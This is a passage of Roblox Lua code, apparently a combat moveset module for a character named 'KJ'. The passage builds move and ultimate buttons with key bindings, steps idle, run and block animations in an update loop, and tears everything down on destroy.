
        if numStr and numStr~="" then
            local nl=Instance.new("TextLabel"); nl.Size=UDim2.new(1,0,0,30)
            nl.Position=UDim2.new(0,0,0,4); nl.BackgroundTransparency=1
            nl.Text=numStr; nl.TextColor3=Color3.new(1,1,1); nl.TextSize=18
            nl.Font=Enum.Font.GothamBold; nl.TextXAlignment=Enum.TextXAlignment.Center
            nl.Parent=btn
        end

        if labelStr and labelStr~="" then
            local la2=Instance.new("TextLabel"); la2.Size=UDim2.new(1,-4,0,36)
            la2.Position=UDim2.new(0,2,0,h-40); la2.BackgroundTransparency=1
            la2.Text=labelStr; la2.TextColor3=Color3.new(1,1,1); la2.TextSize=12
            la2.Font=Enum.Font.Gotham; la2.TextWrapped=true
            la2.TextXAlignment=Enum.TextXAlignment.Center; la2.Parent=btn
        end

        btn.MouseButton1Down:Connect(function()
            btn.BackgroundColor3=Color3.fromRGB(100,100,100)
            if onDown then onDown() end
        end)
        btn.MouseButton1Up:Connect(function()
            btn.BackgroundColor3=Color3.fromRGB(72,72,72)
            if onUp then onUp() end
        end)
        return btn
    end

    -- ── Container principal (mais para baixo) ─────────────────────────────────
    local container = Instance.new("Frame")
    container.Name="MoveContainer"; container.Size=UDim2.new(0,390,0,175)
    container.Position=UDim2.new(0.5,-195,1,-185)   -- mais para baixo
    container.BackgroundTransparency=1; container.Parent=screenGui

    -- Barra ULT
    local ultBarBg = Instance.new("TextButton")
    ultBarBg.Size=UDim2.new(1,0,0,18); ultBarBg.Position=UDim2.new(0,0,0,0)
    ultBarBg.BackgroundColor3=Color3.fromRGB(50,50,50); ultBarBg.BorderSizePixel=0
    ultBarBg.Text=""; ultBarBg.Parent=container

    local ultFill = Instance.new("Frame")
    ultFill.Name="UltFill"; ultFill.Size=UDim2.new(0,0,1,0)
    ultFill.BackgroundColor3=Color3.fromRGB(180,30,30); ultFill.BorderSizePixel=0
    ultFill.Parent=ultBarBg; ultFillRef=ultFill

    local ultBarLbl=Instance.new("TextLabel"); ultBarLbl.Size=UDim2.new(1,0,1,0)
    ultBarLbl.BackgroundTransparency=1; ultBarLbl.Text="ULT"
    ultBarLbl.TextColor3=Color3.new(1,1,1); ultBarLbl.TextSize=10
    ultBarLbl.Font=Enum.Font.GothamBold; ultBarLbl.ZIndex=2; ultBarLbl.Parent=ultBarBg

    ultBarBg.MouseButton1Down:Connect(function() activateUlt() end)
    ContextActions:BindAction("KJ_Ult",function(_,is,_)
        if is==Enum.UserInputState.Begin then activateUlt() end
    end,false,Enum.KeyCode.G)

    -- 4 botões normais
    local normalDefs={
        {num="1",label="Ravage",           fn=playRavage},
        {num="2",label="Swift\nSweep",     fn=playSwift},
        {num="3",label="Collateral\nRuin", fn=playCollateral},
        {num="4",label="Spiralling\nStorm",fn=playSpiralling},
    }
    local normalKeys={Enum.KeyCode.One,Enum.KeyCode.Two,Enum.KeyCode.Three,Enum.KeyCode.Four}
    local normalBtns={}
    for i,d in ipairs(normalDefs) do
        local b=makeBtn(container,d.num,d.label,90,90,d.fn,nil)
        b.Position=UDim2.new(0,(i-1)*98,0,22); normalBtns[i]=b
        ContextActions:BindAction("KJ_Move_"..i,function(_,is,_)
            if is==Enum.UserInputState.Begin then d.fn() end
        end,false,normalKeys[i])
    end

    -- 4 botões ult (ocultos)
    local ultDefs={
        {num="1",label="Stoic\nBomb",          fn=playStoicBomb},
        {num="2",label="Drop\nKick",           fn=playDropkick},
        {num="3",label="Five\nSeasons",        fn=playFiveSeasons},
        {num="4",label="Unlimited\nFlex Works",fn=playUnlimitedFlexWorks},
    }
    local ultBtns={}
    for i,d in ipairs(ultDefs) do
        local b=makeBtn(container,d.num,d.label,90,90,d.fn,nil)
        b.Position=UDim2.new(0,(i-1)*98,0,22); b.Visible=false; ultBtns[i]=b
    end

    -- Barra UFW amarela dentro do botão Unlimited Flex Works (apenas fill, sem bg separado)
    local ufwBtn = ultBtns[4]
    local ufwFillBg = Instance.new("Frame")
    ufwFillBg.Size=UDim2.new(1,0,0,5); ufwFillBg.Position=UDim2.new(0,0,1,-5)
    ufwFillBg.BackgroundColor3=Color3.fromRGB(30,30,30); ufwFillBg.BorderSizePixel=0
    ufwFillBg.ZIndex=3; ufwFillBg.Parent=ufwBtn

    local ufwFill=Instance.new("Frame"); ufwFill.Name="UfwFill"
    ufwFill.Size=UDim2.new(0,0,1,0)
    ufwFill.BackgroundColor3=Color3.fromRGB(255,200,0); ufwFill.BorderSizePixel=0
    ufwFill.ZIndex=4; ufwFill.Parent=ufwFillBg; ufwFillRef=ufwFill

    showUltModeRef=function(active)
        for _,b in ipairs(normalBtns) do b.Visible=not active end
        for _,b in ipairs(ultBtns)    do b.Visible=active     end
        ultBtnsRef = active and ultBtns or nil
        if active then
            for i=1,#normalDefs do ContextActions:UnbindAction("KJ_Move_"..i) end
            for i,d in ipairs(ultDefs) do
                ContextActions:BindAction("KJ_UltMove_"..i,function(_,is,_)
                    if is==Enum.UserInputState.Begin then d.fn() end
                end,false,normalKeys[i])
            end
        else
            for i=1,#ultDefs do ContextActions:UnbindAction("KJ_UltMove_"..i) end
            for i,d in ipairs(normalDefs) do
                ContextActions:BindAction("KJ_Move_"..i,function(_,is,_)
                    if is==Enum.UserInputState.Begin then d.fn() end
                end,false,normalKeys[i])
            end
        end
    end
    m._showUltMode=showUltModeRef

    -- ── Coluna DIREITA: Block / M1 / Dash ─────────────────────────────────────
    local rightCol = Instance.new("Frame")
    rightCol.Name="RightCol"; rightCol.Size=UDim2.new(0,55,0,195)
    rightCol.Position=UDim2.new(1,-65,1,-310)   -- direita, mais para cima
    rightCol.BackgroundTransparency=1; rightCol.Parent=screenGui

    -- Block (🛡) — toggle
    local blockBtnRef = makeBtn(rightCol,"","🛡",55,55,toggleBlock,nil)
    blockBtnRef.Text="🛡"; blockBtnRef.TextSize=24
    blockBtnRef.Position=UDim2.new(0,0,0,0)
    ContextActions:BindAction("KJ_Block",function(_,is,_)
        if is==Enum.UserInputState.Begin then toggleBlock() end
    end,false,Enum.KeyCode.Q)

    -- M1 (👊)
    local m1Btn=makeBtn(rightCol,"","👊",55,55,playM1,nil)
    m1Btn.Text="👊"; m1Btn.TextSize=24
    m1Btn.Position=UDim2.new(0,0,0,68)
    ContextActions:BindAction("KJ_M1",function(_,is,_)
        if is==Enum.UserInputState.Begin then playM1() end
    end,false,Enum.UserInputType.MouseButton1,Enum.KeyCode.T)

    -- Dash (🏃)
    local dashBtn=makeBtn(rightCol,"","🏃",55,55,playDash,nil)
    dashBtn.Text="🏃"; dashBtn.TextSize=24
    dashBtn.Position=UDim2.new(0,0,0,136)
    ContextActions:BindAction("KJ_Dash",function(_,is,_)
        if is==Enum.UserInputState.Begin then playDash() end
    end,false,Enum.KeyCode.E)

    state="none"; setState("idle")
end

-- ─────────────────────────────────────────────────────────────────────────────
-- UPDATE
-- ─────────────────────────────────────────────────────────────────────────────
m.Update = function(dt, figure)
    local now = os.clock()

    if spawning then
        local t = now - spawnStart
        introAnim:Step(t)
        if t >= INTRO_DUR * 0.85 then dropPhone(figure) end
        if t >= INTRO_DUR then
            spawning=false; introAnim.weight=0
            task.delay(0.6, destroyPhone)
            unfreeze(); setState("idle")
        end
        return
    end

    if usingMove or isBlocking or m1InProgress then
        -- stepa o blockAnim enquanto blocking
        if isBlocking and blockAnim then
            blockAnim:Step(now)
        end
        -- Ainda stepa idle/sprint durante m1 (pode andar)
        if m1InProgress then
            local hum = figure:FindFirstChildOfClass("Humanoid")
            if hum then
                if hum.MoveDirection.Magnitude > 0.1 then setState("run") else setState("idle") end
            end
            if idleAnim.weight   > 0 then idleAnim:Step(now) end
            if sprintAnim.weight > 0 then sprintAnim:Step(now) end
        end
        return
    end

    local hum = figure:FindFirstChildOfClass("Humanoid")
    if hum then
        if hum.MoveDirection.Magnitude > 0.1 then setState("run") else setState("idle") end
    end
    if idleAnim.weight   > 0 then idleAnim:Step(now) end
    if sprintAnim.weight > 0 then sprintAnim:Step(now) end
end

-- ─────────────────────────────────────────────────────────────────────────────
-- DESTROY
-- ─────────────────────────────────────────────────────────────────────────────
m.Destroy = function()
    if guiRef   then guiRef:Destroy();                  guiRef=nil   end
    if dropkickVel then dropkickVel:Destroy();           dropkickVel=nil end
    if bgMusicSnd  then bgMusicSnd:Stop(); bgMusicSnd:Destroy(); bgMusicSnd=nil end

    for _,act in ipairs({
        "KJ_Ult","KJ_Block","KJ_M1","KJ_Dash",
        "KJ_Move_1","KJ_Move_2","KJ_Move_3","KJ_Move_4",
        "KJ_UltMove_1","KJ_UltMove_2","KJ_UltMove_3","KJ_UltMove_4",
    }) do ContextActions:UnbindAction(act) end

    destroyPhone(); SetOverrideMovesetMusic()

    idleAnim=nil; sprintAnim=nil; introAnim=nil
    ravageStartAnim=nil; ravageHitAnim=nil; swiftStartAnim=nil; swiftHitAnim=nil
    collateralAnim=nil; spirallingAnim=nil; stoicBombAnim=nil
    dropkickStartupAnim=nil; dropkickHitAnim=nil
    fiveSeasonsStartupAnim=nil; fiveSeasonsMidAnim=nil; fiveSeasonsEndAnim=nil
    unlimitedFlexAnim=nil; ultAnim=nil; ult2Anim=nil; blockAnim=nil
    for i=1,4 do m1Anims[i]=nil end
    dashAnims={}

    inUlt=false; ulting=false; usingMove=false; spawning=false
    isDropkicking=false; isBlocking=false; blockToggle=false; m1Count=0; m1InProgress=false; isDashing=false
    ultCharge=0; ufwCharge=0; UFW_FULL=false
    ultFillRef=nil; ufwFillRef=nil
    currentFigure=nil; currentState="idle"
    showUltModeRef=nil; m._showUltMode=nil
end

return m
end)

return modules

